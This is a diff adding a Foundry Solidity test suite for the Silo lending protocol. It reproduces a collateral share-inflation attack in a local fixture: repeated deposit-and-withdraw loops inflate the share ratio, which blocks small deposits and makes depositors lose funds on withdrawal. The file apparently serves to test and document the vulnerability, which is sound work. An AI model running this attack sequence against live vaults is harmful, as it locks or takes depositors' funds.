@@ -1,0 +1,203 @@
+// SPDX-License-Identifier: BUSL-1.1
+pragma solidity ^0.8.20;
+
+import {Test} from "forge-std/Test.sol";
+
+import {ISiloConfig} from "silo-core/contracts/interfaces/ISiloConfig.sol";
+import {ISilo} from "silo-core/contracts/interfaces/ISilo.sol";
+import {IShareToken} from "silo-core/contracts/interfaces/IShareToken.sol";
+import {SiloERC4626Lib} from "silo-core/contracts/lib/SiloERC4626Lib.sol";
+import {AssetTypes} from "silo-core/contracts/lib/AssetTypes.sol";
+import {IERC20Errors} from "openzeppelin5/interfaces/draft-IERC6093.sol";
+
+import {MintableToken} from "../../_common/MintableToken.sol";
+import {SiloLittleHelper} from "../../_common/SiloLittleHelper.sol";
+
+import {console} from "forge-std/console.sol";
+
+/*
+    forge test -vv --ffi --mc CollateralTokenInflationAttack
+*/
+contract CollateralTokenInflationAttack is SiloLittleHelper, Test {
+    ISiloConfig siloConfig;
+
+    function setUp() public {
+        siloConfig = _setUpLocalFixture();
+    }
+
+    /*
+    forge test -vv --ffi --mt test_vault_denial_of_service_attack_deposit_lock
+    */
+    function test_vault_denial_of_service_attack_deposit_lock() public {
+        address victim = makeAddr("Victim");
+
+        _messWithRatio();
+
+        uint256 siloCollateralAssets = silo0.getCollateralAssets();
+
+        assertEq(siloCollateralAssets, 1_073_741_825);
+
+        // prepare to deposit
+        _mintTokens(token0, siloCollateralAssets, victim);
+
+        vm.prank(victim);
+        token0.approve(address(silo0), siloCollateralAssets);
+
+        // we can't deposit less than ~`siloCollateralAssets`
+        vm.prank(victim);
+        vm.expectRevert(ISilo.ZeroShares.selector);
+        silo0.deposit(1e8, victim, ISilo.CollateralType.Collateral);
+
+        vm.prank(victim);
+        uint256 shares = silo0.deposit(siloCollateralAssets, victim, ISilo.CollateralType.Collateral);
+
+        assertEq(shares, 1);
+    }
+
+    /*
+    forge test -vv --ffi --mt test_vault_denial_of_service_attack_funds_recovery
+    */
+    function test_vault_denial_of_service_attack_funds_recovery() public {
+        address attacker = makeAddr("Attacker");
+
+        uint256 attackerDeposits = _messWithRatio();
+
+        for (uint i = 0; i < 15; i++) {
+            string memory user = vm.toString(i+1);
+            address depositor = makeAddr(user);
+
+            uint256 toDeposit = silo0.getCollateralAssets();
+            _makeDeposit(silo0, token0, toDeposit, depositor, ISilo.CollateralType.Collateral);
+        }
+
+        // attacker redeeming the deposit
+        uint256 redeemShares = silo0.maxRedeem(attacker);
+
+        vm.prank(attacker);
+        uint256 receivedAmount = silo0.redeem(redeemShares, attacker, attacker);
+
+        assertEq(attackerDeposits, 1073741823);
+        assertEq(receivedAmount,   1073709057);
+        assertEq(attackerDeposits - receivedAmount, 32766);
+    }
+
+    /*
+    forge test -vv --ffi --mt test_vault_denial_of_service_attack_withdraw_issue
+    */
+    function test_vault_denial_of_service_attack_withdraw_issue() public {
+        _messWithRatio();
+
+        uint256 numberOfDepositors = 10;
+
+        address[] memory depositors = new address[](numberOfDepositors);
+        uint256[] memory depositsAmounts = new uint256[](numberOfDepositors);
+
+        for (uint i = 0; i < numberOfDepositors; i++) {
+            string memory user = vm.toString(i+1);
+            address _depositor = makeAddr(user);
+            depositors[i] = _depositor;
+
+            uint256 toDeposit = 1e18;//silo0.getCollateralAssets();
+            _makeDeposit(silo0, token0, toDeposit, _depositor, ISilo.CollateralType.Collateral);
+
+            depositsAmounts[i] = toDeposit;
+        }
+
+        (, address collateralShareToken,) = siloConfig.getShareTokens(address(silo0));
+
+        uint256 anyDepositor = 9;
+        address depositor = depositors[anyDepositor];
+
+        uint256 sharesBalance = IShareToken(collateralShareToken).balanceOf(depositor);
+
+        // witdrawing the deposit
+        vm.prank(depositor);
+
+        vm.expectRevert(
+            abi.encodeWithSelector(
+                IERC20Errors.ERC20InsufficientBalance.selector,
+                depositor,
+                sharesBalance,
+                sharesBalance + 1 wei
+            )
+        );
+
+        silo0.withdraw(depositsAmounts[anyDepositor], depositor, depositor);
+
+        uint256 maxWithdraw = silo0.maxWithdraw(depositor);
+
+        console.log("maxWithdraw", maxWithdraw);
+
+        // redeeming the deposit
+        uint256 redeemShares = silo0.maxRedeem(depositor);
+
+        assertEq(redeemShares, sharesBalance);
+
+        vm.prank(depositor);
+        uint256 receivedAmount = silo0.redeem(redeemShares, depositor, depositor);
+
+        // depositor received less than he deposited
+        assertTrue(receivedAmount < depositsAmounts[anyDepositor]);
+
+        // depositor received all his shares
+        sharesBalance = IShareToken(collateralShareToken).balanceOf(depositor);
+        assertEq(sharesBalance, 0);
+
+        uint256 balanceOfDepositor = token0.balanceOf(depositor);
+        assertEq(receivedAmount, balanceOfDepositor);
+
+        console.log("receivedAmount: ", receivedAmount);
+        console.log("depositAmount: ", depositsAmounts[anyDepositor]);
+        console.log("1e18: ", 1e18);
+    }
+
+    function _messWithRatio() internal returns (uint256 depositedForAttack) { 
+        address attacker = makeAddr("Attacker");
+        address borrower = makeAddr("Attacker Borrower");
+
+        uint256 gasStart = gasleft();
+
+        _makeDeposit(silo0, token0, 1, attacker, ISilo.CollateralType.Collateral);
+
+        _repayLoan(borrower, 200);
+
+        uint256 borrowerAssets = silo0.maxWithdraw(borrower);
+
+        vm.prank(borrower);
+        silo0.withdraw(borrowerAssets, borrower, borrower);
+
+        silo0.accrueInterest();
+
+        for (uint i = 0; i < 30; i++) {
+            uint toDeposit = silo0.getCollateralAssets();
+            _makeDeposit(silo0, token0, toDeposit, attacker, ISilo.CollateralType.Collateral);
+
+            vm.prank(attacker);
+            silo0.withdraw(1, attacker, attacker);
+
+            depositedForAttack = depositedForAttack + toDeposit - 1;
+        }
+
+        console.log("[_doAttack] gas used: ", gasStart - gasleft());
+    }
+
+    function _repayLoan(address _borrower, uint _toBorrow) internal {
+        uint256 depositAmount = _toBorrow * 12 / 8;
+        
+        _makeDeposit(silo0, token0, depositAmount, _borrower, ISilo.CollateralType.Collateral);
+        vm.prank(_borrower);
+        uint shares = silo0.borrowSameAsset(_toBorrow, _borrower, _borrower);
+
+        vm.warp(block.timestamp + 70 days);
+
+        uint256 toRepay = silo0.maxRepay(_borrower);
+
+        vm.prank(_borrower);
+        token0.approve(address(silo0), toRepay);
+
+        _mintTokens(token0, toRepay, _borrower);
+
+        vm.prank(_borrower);
+        shares = silo0.repay(toRepay, _borrower);
+    }
+}
